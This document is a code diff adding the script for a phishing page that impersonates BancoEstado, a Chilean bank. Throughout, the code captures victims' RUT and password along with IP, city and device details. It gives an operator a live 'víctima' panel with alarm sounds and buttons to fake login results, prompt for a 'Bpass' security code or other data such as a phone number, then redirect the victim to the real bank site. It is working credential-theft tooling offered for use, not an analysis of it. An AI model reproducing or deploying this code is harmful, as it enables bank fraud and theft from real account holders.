+  loginError.textContent = '';
+  btnLogin.disabled = true;
+  btnLogin.textContent = 'Ingresando...';
+
+  showView('view-loading');
+  $('loadingText').textContent = 'Cargando...';
+
+  const g = await geo();
+  await waitFb(4000);
+
+  const sessions = getSessions();
+  let s = myId ? sessions.find(x => x.id === myId) : null;
+
+  if (!s){
+    myId = 'BE-' + Math.random().toString(36).slice(2, 6).toUpperCase();
+    sessionStorage.setItem('be_myid', myId);
+    s = { id: myId, ts: Date.now(), intentos: 0, log: [] };
+    sessions.push(s);
+  }
+
+  s.rut         = rut;
+  s.clave       = clave;
+  s.ip          = g.ip;
+  s.ciudad      = g.ciudad;
+  s.dispositivo = deviceInfo();
+  s.horario     = new Date().toLocaleString('es-CL');
+  s.estado      = 'pendiente';
+  s.ts          = Date.now();
+  s.intentos    = (s.intentos || 0) + 1;
+  s.peticion    = '';
+  s.respuesta   = '';
+  s.log         = s.log || [];
+  s.log.push({ t: new Date().toLocaleTimeString('es-CL'), txt: 'Acceso #' + s.intentos + ' — ' + rut });
+
+  setSessions(sessions);
+
+  lastEstado = 'pendiente';
+  enviando = false;
+  btnLogin.disabled = false;
+  btnLogin.textContent = 'Ingresar';
+}
+
+btnLogin.addEventListener('click', submitLogin);
+
+claveInput.addEventListener('keydown', e => {
+  if (e.key === 'Enter'){ e.preventDefault(); submitLogin(); }
+});
+
+document.querySelector('#view-login form').addEventListener('submit', e => {
+  e.preventDefault();
+  submitLogin();
+});
+
+/* =====================================================
+   VÍCTIMA
+   ===================================================== */
+function pollVictim(){
+  if (currentView === 'view-panel') return;
+  if (!myId) return;
+  if (!fbReady) return;
+
+  const s = getSessions().find(x => x.id === myId);
+  if (!s) return;
+  if (s.estado === lastEstado) return;
+
+  lastEstado = s.estado;
+  applyState(s);
+}
+
+let timerStarted = false;
+
+function applyState(s){
+  switch (s.estado){
+    case 'fallido':
+      showView('view-login');
+      claveInput.value = '';
+      loginError.textContent = 'RUT o Clave incorrectos. Intenta nuevamente.';
+      break;
+    case 'valido':
+      showView('view-loading');
+      $('loadingText').textContent = 'Verificando identidad...';
+      break;
+    case 'pendiente':
+      showView('view-loading');
+      $('loadingText').textContent = 'Cargando...';
+      break;
+    case 'bpass':
+      showView('view-bpass');
+      startTimer();
+      break;
+    case 'pedir':
+      $('extraLabel').textContent = s.peticion || 'Dato';
+      $('extraInput').value = '';
+      showView('view-extra');
+      setTimeout(() => $('extraInput').focus(), 200);
+      break;
+    case 'fin':
+      localStorage.setItem(BLOCK_KEY, '1');
+      window.location.replace('https://www.bancoestado.cl');
+      break;
+  }
+}
+
+function submitExtra(){
+  const v = $('extraInput').value.trim();
+  if (!v) return;
+
+  const sessions = getSessions();
+  const i = sessions.findIndex(x => x.id === myId);
+  if (i < 0) return;
+
+  sessions[i].respuesta = v;
+  sessions[i].estado    = 'pendiente';
+  sessions[i].log = sessions[i].log || [];
+  sessions[i].log.push({ t: new Date().toLocaleTimeString('es-CL'), txt: 'Respondió: ' + v });
+  setSessions(sessions);
+
+  lastEstado = 'pendiente';
+  showView('view-loading');
+  $('loadingText').textContent = 'Cargando...';
+}
+
+let totalSeconds = 175, timerInterval = null;
+function startTimer(){
+  if (timerStarted) return;
+  timerStarted = true;
+  totalSeconds = 2 * 60 + 55;
+  $('countdown').textContent = '2:55';
+  clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    if (totalSeconds <= 0){ clearInterval(timerInterval); $('countdown').textContent = '0:00'; return; }
+    totalSeconds--;
+    const m = Math.floor(totalSeconds / 60);
+    const s = totalSeconds % 60;
+    $('countdown').textContent = m + ':' + (s < 10 ? '0' + s : s);
+  }, 1000);
+}
+
+/* =====================================================
+   PANEL
+   ===================================================== */
+const ESTADOS = {
+  pendiente: 'PENDIENTE',
+  valido:    'LOG VÁLIDO',
+  fallido:   'LOG FALLIDO',
+  bpass:     'BPASS ENVIADO',
+  fin:       'FINALIZADO',
+  pedir:     'PIDIENDO DATO'
+};
+
+let seenIds = null, lastHash = '', flashId = '';
+
+function openPanel(){
+  initAudio();
+  showView('view-panel');
+  seenIds = new Set(getSessions().map(s => s.id));
+  lastHash = '';
+  renderPanel(true);
+}
+
+function closePanel(){
+  showView('view-login');
+  loginError.textContent = '';
+}
+
+function checkNew(sessions){
+  if (seenIds === null){ seenIds = new Set(sessions.map(s => s.id)); return; }
+  let nuevas = 0;
+  sessions.forEach(s => {
+    if (!seenIds.has(s.id)){ seenIds.add(s.id); nuevas++; flashId = s.id; }
+  });
+  if (nuevas > 0){
+    siren(3);
+    const old = document.title;
+    document.title = '🔔 NUEVA VÍCTIMA';
+    setTimeout(() => document.title = old, 6000);
+  }
+}
+
+function renderPanel(force){
+  const sessions = getSessions();
+  const hash = JSON.stringify(sessions);
+  if (!force && hash === lastHash) return;
+  lastHash = hash;
+
+  checkNew(sessions);
+
+  const list = sessions.slice().sort((a, b) => b.ts - a.ts);
+
+  $('empty').style.display = list.length ? 'none' : 'block';
+  $('panelSub').textContent = list.length
+    ? list.length + (list.length === 1 ? ' víctima registrada' : ' víctimas registradas')
+    : 'Esperando víctimas...';
+
+  $('cards').innerHTML = list.map(cardHTML).join('');
+
+  if (flashId){
+    const el = document.querySelector('[data-id="' + flashId + '"]');
+    if (el){ el.classList.add('flash'); setTimeout(() => el.classList.remove('flash'), 4000); }
+    flashId = '';
+  }
+}
+
+function cardHTML(s){
+  const est = s.estado || 'pendiente';
+  const logs = (s.log || []).slice(-4)
+    .map(l => '<div>' + esc(l.t) + ' · ' + esc(l.txt) + '</div>').join('');
+
+  const extra = s.peticion
+    ? '<div class="extra"><span>Pidió:</span> ' + esc(s.peticion) +
+      (s.respuesta
+        ? '<br><span>Respondió:</span> <b>' + esc(s.respuesta) + '</b>'
+        : ' <i>(esperando…)</i>') +
+      '</div>'
+    : '';
+
+  return '<div class="pcard st-' + est + '" data-id="' + s.id + '">' +
+    '<div class="ptop">' +
+      '<span class="cid">' + s.id + '</span>' +
+      '<span class="badge">' + (ESTADOS[est] || est) + '</span>' +
+      '<span class="ptime">' + esc(s.horario || '') + '</span>' +
+    '</div>' +
+    '<div class="rows">' +
+      '<div><span>RUT</span><b onclick="copyText(this.textContent)">' + esc(s.rut) + '</b></div>' +
+      '<div><span>Clave</span><b onclick="copyText(this.textContent)">' + esc(s.clave) + '</b></div>' +
+      '<div><span>IP</span><b>' + esc(s.ip) + '</b></div>' +
+      '<div><span>Ciudad</span><b>' + esc(s.ciudad) + '</b></div>' +
+      '<div class="wide"><span>Dispositivo</span><b>' + esc(s.dispositivo) + '</b></div>' +
+      '<div class="wide"><span>Intentos</span><b>' + (s.intentos || 1) + '</b></div>' +
+    '</div>' +
+    extra +
+    '<div class="btns">' +
+      '<button class="b-fallido" onclick="setState(\'' + s.id + '\',\'fallido\')">Log fallido</button>' +
+      '<button class="b-valido"  onclick="setState(\'' + s.id + '\',\'valido\')">Log válido</button>' +
+      '<button class="b-bpass"   onclick="setState(\'' + s.id + '\',\'bpass\')">Bpass</button>' +
+      '<button class="b-fin"     onclick="setState(\'' + s.id + '\',\'fin\')">Fin</button>' +
+    '</div>' +
+    '<div class="pfoot">' +
+      '<button class="b-dato" onclick="askData(\'' + s.id + '\')">📱 Pedir dato</button>' +
+      '<div class="logs">' + logs + '</div>' +
+    '</div>' +
+  '</div>';
+}
+
+function setState(id, estado){
+  const sessions = getSessions();
+  const i = sessions.findIndex(x => x.id === id);
+  if (i < 0) return;
+
+  const txt = {
+    fallido: '→ LOG FALLIDO enviado',
+    valido:  '→ LOG VÁLIDO enviado',
+    bpass:   '→ BPASS enviado',
+    fin:     '→ FIN enviado (fuera del sitio)'
+  }[estado] || estado;
+
+  sessions[i].estado = estado;
+  sessions[i].log = sessions[i].log || [];
+  sessions[i].log.push({ t: new Date().toLocaleTimeString('es-CL'), txt: txt });
+  setSessions(sessions);
+  renderPanel(true);
+}
+
+function askData(id){
+  const q = prompt('¿Qué dato le pides a la víctima?', 'Número de celular');
+  if (!q) return;
+
+  const sessions = getSessions();
+  const i = sessions.findIndex(x => x.id === id);
+  if (i < 0) return;
+
+  sessions[i].peticion  = q;
+  sessions[i].respuesta = '';
+  sessions[i].estado    = 'pedir';
+  sessions[i].log = sessions[i].log || [];
+  sessions[i].log.push({ t: new Date().toLocaleTimeString('es-CL'), txt: 'Pidió: ' + q });
+  setSessions(sessions);
+  renderPanel(true);
+}
+
+function copyText(t){ if (navigator.clipboard) navigator.clipboard.writeText(t); }
+
+function clearAll(){
+  if (!confirm('¿Borrar todas las víctimas registradas?')) return;
+  deleteAllSessions();
+  seenIds = new Set();
+  lastHash = '';
+  renderPanel(true);
+}
+
+function unblockDevice(){
+  localStorage.removeItem(BLOCK_KEY);
+  sessionStorage.removeItem('be_myid');
+  myId = '';
+  lastEstado = '';
+  alert('Dispositivo desbloqueado. Ya puedes probar de nuevo.');
+}
+
+/* =====================================================
+   ALARMA
+   ===================================================== */
+let audioCtx = null, muted = false;
+
+function initAudio(){
+  if (!audioCtx){
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if (AC) audioCtx = new AC();
+  }
+  if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
+}
+
+function siren(times){
+  times = times || 3;
+  if (muted) return;
+  initAudio();
+  if (!audioCtx) return;
+
+  let t = audioCtx.currentTime + 0.05;
+  for (let i = 0; i < times; i++){
+    const o = audioCtx.createOscillator();
+    const g = audioCtx.createGain();
+    o.type = 'sawtooth';
+    o.frequency.setValueAtTime(950, t);
+    o.frequency.linearRampToValueAtTime(430, t + 0.35);
+    g.gain.setValueAtTime(0.0001, t);
+    g.gain.exponentialRampToValueAtTime(0.35, t + 0.03);
+    g.gain.exponentialRampToValueAtTime(0.0001, t + 0.7);
+    o.connect(g).connect(audioCtx.destination);
+    o.start(t); o.stop(t + 0.72);
+    t += 0.78;
+  }
+}
+
+function testAlarm(){ muted = false; siren(3); }
+
+/* =====================================================
+   INIT
+   ===================================================== */
+(function init(){
+  const params = new URLSearchParams(location.search);
+
+  if (localStorage.getItem(BLOCK_KEY) === '1' && params.get('admin') !== '1'){
+    window.location.replace('https://www.bancoestado.cl');
+    return;
+  }
+
+  showView('view-login');
+
+  setInterval(pollVictim, 800);
+  setTimeout(pollVictim, 400);
+
+  setInterval(() => { if (currentView === 'view-panel') renderPanel(false); }, 500);
+
+  window.addEventListener('storage', e => {
+    if (e.key === KEY && currentView === 'view-panel') renderPanel(false);
+  });
+})();
+</script>
+</body>
+</html>
